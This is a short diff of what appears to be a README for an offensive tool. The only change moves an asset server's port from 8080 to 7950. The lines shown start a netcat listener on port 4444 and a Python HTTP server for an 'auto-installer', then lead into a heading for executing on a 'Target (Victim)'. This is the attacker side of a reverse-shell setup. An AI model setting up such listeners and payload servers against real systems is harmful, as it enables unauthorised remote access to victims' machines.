@@ -13,7 +13,7 @@ On your machine, open a terminal:
 nc -lvnp 4444
 
 # (Optional) Start the asset server for the auto-installer
-python3 -m http.server 8080
+python3 -m http.server 7950
 ```
 
 ### 2. Execute on Target (Victim)
